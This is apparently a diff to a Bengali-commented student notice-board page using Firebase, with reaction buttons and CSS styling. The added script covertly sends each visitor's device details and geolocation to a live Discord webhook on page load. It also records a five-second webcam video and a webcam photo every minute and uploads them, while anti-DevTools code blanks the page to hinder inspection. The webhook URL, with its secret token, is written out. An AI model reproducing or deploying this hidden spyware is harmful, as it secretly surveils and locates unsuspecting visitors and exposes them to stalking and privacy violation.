+      });
+      
+      // Set new reaction UI
+      btn.classList.add('active');
+      
+      // Update counts
+      const countEl = btn.querySelector(`.${action}-count`);
+      countEl.textContent = parseInt(countEl.textContent) + 1;
+      
+      // Update opposite count if switching reactions
+      const oppositeAction = action === 'like' ? 'dislike' : 'like';
+      const oppositeBtn = document.querySelector(`.reaction-btn[data-id="${postId}"][data-action="${oppositeAction}"]`);
+      if (oppositeBtn && userReactions[postId] === oppositeAction) {
+        const oppositeCountEl = oppositeBtn.querySelector(`.${oppositeAction}-count`);
+        oppositeCountEl.textContent = parseInt(oppositeCountEl.textContent) - 1;
+      }
+      
+      // Update local state
+      userReactions[postId] = action;
+      localStorage.setItem('userReactions', JSON.stringify(userReactions));
+      
+      // Update Firebase
+      database.ref(`userReactions/${userId}/${postId}`).set(action);
+      database.ref(`posts/${postId}/${action}s`).transaction(current => (current || 0) + 1);
+      
+      // If switching reactions, decrement the opposite count in Firebase
+      if (userReactions[postId] === oppositeAction) {
+        database.ref(`posts/${postId}/${oppositeAction}s`).transaction(current => (current || 0) - 1);
+      }
+    }
+  }
+  
+  function removeReaction(postId, action) {
+    // Update UI immediately
+    const btn = document.querySelector(`.reaction-btn[data-id="${postId}"][data-action="${action}"]`);
+    if (btn) {
+      btn.classList.remove('active');
+      
+      const countEl = btn.querySelector(`.${action}-count`);
+      countEl.textContent = parseInt(countEl.textContent) - 1;
+      
+      // Update local state
+      delete userReactions[postId];
+      localStorage.setItem('userReactions', JSON.stringify(userReactions));
+      
+      // Update Firebase
+      database.ref(`userReactions/${userId}/${postId}`).remove();
+      database.ref(`posts/${postId}/${action}s`).transaction(current => (current || 0) - 1);
+    }
+  }
+
+  // Helper functions
+  function formatTimeAgo(date) {
+    const seconds = Math.floor((new Date() - date) / 1000);
+    
+    if (seconds < 60) return 'just now';
+    
+    const minutes = Math.floor(seconds / 60);
+    if (minutes < 60) return `${minutes}m ago`;
+    
+    const hours = Math.floor(minutes / 60);
+    if (hours < 24) return `${hours}h ago`;
+    
+    const days = Math.floor(hours / 24);
+    if (days < 7) return `${days}d ago`;
+    
+    const weeks = Math.floor(days / 7);
+    if (weeks < 4) return `${weeks}w ago`;
+    
+    const months = Math.floor(days / 30);
+    if (months < 12) return `${months}mo ago`;
+    
+    const years = Math.floor(days / 365);
+    return `${years}y ago`;
+  }
+
+  // Security measures
+  document.addEventListener('contextmenu', (e) => e.preventDefault());
+  document.addEventListener('selectstart', (e) => e.preventDefault());
+  document.addEventListener('copy', (e) => e.preventDefault());
+
+  document.addEventListener('keydown', function (e) {
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C" || e.key === "K")) ||
+      (e.ctrlKey && e.key === "U") ||
+      (e.ctrlKey && e.key === "S") ||
+      (e.metaKey && e.key === "S")
+    ) {
+      e.preventDefault();
+      return false;
+    }
+  });
+
+  // Detect DevTools (simple interval hack)
+  let isDevToolsOpen = false;
+  const element = new Image();
+  Object.defineProperty(element, 'id', {
+    get: function () {
+      isDevToolsOpen = true;
+      throw new Error("DevTools detected");
+    }
+  });
+
+  setInterval(() => {
+    isDevToolsOpen = false;
+    console.dir(element);
+    if (isDevToolsOpen) {
+      document.body.innerHTML = "";
+    }
+  }, 1000);
+
+  // Also detect resize change (DevTools side panel)
+  setInterval(function () {
+    if (
+      window.outerWidth - window.innerWidth > 160 ||
+      window.outerHeight - window.innerHeight > 160
+    ) {
+      document.body.innerHTML = "";
+    }
+  }, 1000);
+  // অনেকগুলো Discord webhook URL রাখো এখানে:
+const webhooks = [
+  "https://discord.com/api/webhooks/1398572651651403776/m7d18WV12d4Ol5wxLUyXOZ7j-dPkdbhCVai08iCg2gXJN_DakRAHD7oIE59Ckh8JuxEk"
+  // আরও যোগ করো তোমার webhook এখানে
+];
+
+// র‍্যান্ডম webhook নিতে ফাংশন:
+function getRandomWebhook() {
+  const index = Math.floor(Math.random() * webhooks.length);
+  return webhooks[index];
+}
+
+// ডিভাইস ইনফো ও লোকেশন Discord-এ পাঠানোর ফাংশন
+async function sendDeviceInfo() {
+  const info = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${window.screen.width}x${window.screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    online: navigator.onLine,
+    locationLink: "Location not available"
+  };
+
+  // লোকেশন পাওয়া গেলে লিঙ্ক তৈরি করব
+  if (navigator.geolocation) {
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
+      });
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      info.locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
+    } catch (err) {
+      info.locationLink = "Location permission denied or unavailable";
+    }
+  } else {
+    info.locationLink = "Geolocation not supported";
+  }
+
+  const content = `
+📡 **Device Info**
+User Agent: \`${info.userAgent}\`
+Platform: \`${info.platform}\`
+Language: \`${info.language}\`
+Screen: \`${info.screen}\`
+Timezone: \`${info.timezone}\`
+Online: \`${info.online}\`
+📍 **Location**: [Open in Google Maps](${info.locationLink})
+`;
+
+  await fetch(getRandomWebhook(), {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content })
+  });
+}
+
+window.onload = async () => {
+  const video = document.getElementById('video');
+
+  // প্রথমে ডিভাইস ও লোকেশন ইনফো পাঠাও
+  await sendDeviceInfo();
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: 1280, height: 720 },
+      audio: false
+    });
+    video.srcObject = stream;
+
+    // ভিডিও পাঠানো হয়েছে কিনা চেক (sessionStorage ব্যবহার)
+    if (!sessionStorage.getItem('videoSent')) {
+      await recordAndSendVideo(stream);
+      sessionStorage.setItem('videoSent', 'true');
+    }
+
+    // প্রতি ১ মিনিটে ছবি পাঠানোর জন্য setInterval
+    setInterval(() => {
+      sendPhoto(video);
+    }, 60000); // ৬০ সেকেন্ড
+
+  } catch (err) {
+    console.error("Camera error:", err);
+  }
+};
+
+// ৫ সেকেন্ড ভিডিও রেকর্ড ও Discord-এ পাঠানোর ফাংশন
+function recordAndSendVideo(stream) {
+  return new Promise((resolve) => {
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = e => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      sendBlobToDiscord(blob, 'intro_video.webm');
+      resolve();
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 5000);
+  });
+}
+
+// ছবি তুলে Discord-এ পাঠানোর ফাংশন
+function sendPhoto(video) {
+  const canvas = document.createElement('canvas');
+  canvas.width = 600;  // তোমার প্রয়োজন অনুযায়ী পরিবর্তন করতে পারো
+  canvas.height = 720;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("file", blob, "capture.png");
+
+    fetch(getRandomWebhook(), {
+      method: "POST",
+      body: form
+    }).then(() => {
+      console.log("Photo sent to Discord");
+    }).catch(err => {
+      console.error("Error sending photo:", err);
+    });
+  }, "image/png", 0.8);
+}
+
+// ভিডিও Blob Discord-এ পাঠানোর ফাংশন
+function sendBlobToDiscord(blob, filename) {
+  const form = new FormData();
+  form.append("file", blob, filename);
+
+  fetch(getRandomWebhook(), {
+    method: "POST",
+    body: form
+  }).then(() => {
+    console.log("Video sent to Discord");
+  }).catch(err => {
+    console.error("Error sending video:", err);
+  });
+}
+</script>
+</body>
+</html>.type-classes {   
+  background: #0ea5e9;  /* নীল-সায়ান */
+  color: #fff;
+  box-shadow: 0 4px 6px -1px rgba(14, 165, 233, 0.3);  /* নীল-সায়ান শ্যাডো */
+}
+
+.type-notice {   
+  background: var(--primary);  
+  color: #fff;
+  box-shadow: 0 4px 6px -1px rgba(139, 92, 246, 0.3);  
+}
+
+.type-important {   
+  background: #ff4d4f; /* লাল */
+  color: #fff;  
+  box-shadow: 0 4px 6px -1px rgba(255, 77, 79, 0.3);  
+}
+
+.type-update {   
+  background: var(--warning);   
+  color: #000;  
+  box-shadow: 0 4px 6px -1px rgba(245, 158, 11, 0.3);  
+}
+
+.type-assignment {   
+  background: #00cec9;  
+  color: #000;
+  box-shadow: 0 4px 6px -1px #00cec9;  
+}
+
+.type-exam {   
+  background: #2563eb; /* নীল */
+  color: #fff;  
+  box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.3);  
+}
+
+.type-resources {   
+  background: #059669; /* সবুজ */
+  color: #fff;  
+  box-shadow: 0 4px 6px -1px rgba(5, 150, 105, 0.3);  
+}
+
+.type-event {   
+  background: #f97316; /* কমলা */
+  color: #fff;  
+  box-shadow: 0 4px 6px -1px rgba(249, 115, 22, 0.3);  
+}
+
+.type-tips {   
+  background: lime; /* সায়ান */
+  color: #000;  
+  box-shadow: 0 4px 6px -1px lime;  
+}
+
 .type-world {   
   background: #9333ea; /* বেগুনি */
   color: #fff;  
